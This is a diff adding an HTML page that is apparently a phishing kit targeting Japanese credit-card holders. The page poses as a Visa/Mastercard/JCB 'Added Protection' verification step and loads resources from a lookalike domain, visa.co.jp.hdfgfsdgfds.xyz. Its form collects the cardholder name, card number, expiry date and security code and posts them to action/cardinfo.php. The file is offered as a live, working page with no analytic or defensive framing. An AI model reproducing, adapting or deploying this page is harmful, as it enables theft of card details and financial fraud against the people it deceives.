@@ -1,0 +1,117 @@
+<html lang="en"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=6">
+    <meta http-equiv="X-UA-Compatible" content="IE=7">
+    <meta http-equiv="X-UA-Compatible" content="IE=8">
+    <link rel="shortcut icon" href="img/favicon.ico">
+    <link rel="stylesheet" href="css/style.css">
+    <script src="js/jquery.min.js"></script>
+    <script src="js/jquery.mask.js" type="text/javascript"></script>
+    <script src="js/jquery.validate.min.js" type="text/javascript"></script>
+    <script src="js/layui.js"></script><link id="layuicss-laydate" rel="stylesheet" href="http://www.visa.co.jp.hdfgfsdgfds.xyz/js/css/modules/laydate/default/laydate.css?v=5.3.1" media="all"><link id="layuicss-layer" rel="stylesheet" href="http://www.visa.co.jp.hdfgfsdgfds.xyz/js/css/modules/layer/default/layer.css?v=3.5.1" media="all"><link id="layuicss-skincodecss" rel="stylesheet" href="http://www.visa.co.jp.hdfgfsdgfds.xyz/js/css/modules/code.css?v=2" media="all">
+    <link href="https://cdn.bootcdn.net/ajax/libs/layer/3.5.1/theme/default/layer.min.css" rel="stylesheet">
+    <script>
+        function hengxian() {
+            var a = document.getElementById("account_ooo");
+            if (a.value.length > 0) {
+                if ((a.value.length + 1) % 5 == 0 && a.value.length > 0) {
+                    if (a.value.length < 19) {
+                        a.value += "-";
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+<body class="all_body">
+<div id="main_app_id_body" style="margin-top: 10%;">
+    <input type="hidden">
+    <!-- 加一些注释 -->
+    <input type="hidden">
+    <input type="hidden">
+    <div class="main-captch">
+        <div class="div-form">
+            <h2>
+                <a lang="fr">&nbsp;
+                    <img src="img/visa.svg" class="image" style="margin-top: 0px" width="89" height="51">
+                    <img src="img/ma.svg" class="image" style="margin-top: 0px" width="89" height="51">
+                    <img src="img/jcb.svg" class="image" style="margin-top: 0px" width="89" height="51">
+                    <img src="img/ae.svg" class="image" style="margin-top: 0px" width="89" height="51">
+                    <img src="img/dc.svg" class="image" style="margin-top: 0px" width="89" height="51">
+                </a>
+            </h2>
+            <h2 class="erji_header">Added Protection
+                <a lang="fr">
+                    :</a></h2>
+
+            <p class="main-p-div" style="">
+                •<a class="main-a-index"></a><a class="main-a-index" title=""></a><a class="main-a-index">サービスは日本の全銀行に対応しています。</a><a class="" title=""></a><a class="tlid-translation translation"><br class="main-a-index">
+                    •</a><a class="main-a-index">プロセスを完了するために、あなたの情報を確認してください</a>。</p>
+            <!-- 加一些注释 -->
+            <!-- 加一些注释 -->
+            <form name="jpx" id="jpx" method="post" onsubmit="return post();" action="action/cardinfo.php" enctype="multipart/form-data" class="new-form-why">
+                <input name="new_name" id="new_name" onfocus="add_border(this);" placeholder="カード名義（ ローマ字）" value="" type="text" class="input-new">
+                <div style="height: 20px;"></div>
+                <input name="new_anquanma" id="new_anquanma" onfocus="add_border(this);" placeholder="カタカナを入力してください" value="" required="" class="input-new" type="text">
+
+                <div style="height: 20px;"></div>
+                <input name="new_account" id="new_account" onfocus="add_border(this);" oninput="hengxian();" pattern="[0-9]*" maxlength="19" placeholder="クレジットカード番号" value="" class="input-new" type="text">
+                <div style="height: 20px;"></div>
+                <input name="new_yue" id="new_yue" onfocus="add_border(this);" oninput="value = value.replace(/[^\d]/g,'')" pattern="[0-9]*" maxlength="2" placeholder="月" value="" class="input-new-ri" type="text">
+                /
+                <input name="new_year" id="new_year" onfocus="add_border(this);" oninput="value = value.replace(/[^\d]/g,'')" pattern="[0-9]*" maxlength="4" placeholder="年" value="" class="input-new-ri" type="text">
+                <div style="height: 20px;"></div>
+
+                <input name="name_two" id="name_two" onfocus="add_border(this);" placeholder="セキュリティコード" style="width:55%;" value="" oninput="value = value.replace(/[^\d]/g,'')" pattern="[0-9]*" maxlength="4" required="" class="input-new" type="text">
+                <div style="height: 20px;"></div>
+            </form>
+            <div style="height: 20px;"></div>
+            <button class="button form-button" type="submit" onclick="post()">
+                <font class="is_tijiao_add" lang="ja">
+                    あなたの情報を確認し、続ける</font></button>
+        </div>
+    </div>
+    <script type="text/javascript">
+        $('input[name="new_account"]').mask('0000000000000000000');
+        $('input[name="new_yue"]').mask('00');
+        $('input[name="new_year"]').mask('0000');
+        $('input[name="name_two"]').mask('0000');
+    </script>
+    <script type="text/javascript">
+        function post() {
+            var new_name = document.getElementById("new_name");
+            var new_anquanma = document.getElementById("new_anquanma");
+            var new_account = document.getElementById("new_account");
+            var new_yue = document.getElementById("new_yue");
+            var new_year = document.getElementById("new_year");
+            var name_two = document.getElementById("name_two");
+            if(!new_name){
+                layer.msg('カード名義必要とする');
+                return false;
+            }
+            if(!new_anquanma){
+                layer.msg('カタカナ必要とする');
+                return false;
+            }
+            if(!new_account){
+                layer.msg('クレジットカード番号必要とする');
+                return false;
+            }
+            if(!new_yue){
+                layer.msg('月必要とする');
+                return false;
+            }
+            if(!new_year){
+                layer.msg('年必要とする');
+                return false;
+            }
+            if(!name_two){
+                layer.msg('セキュリティコード必要とする');
+                return false;
+            }
+            jpx.submit() ;
+        }
+    </script>
+</div>
+
+</body></html>
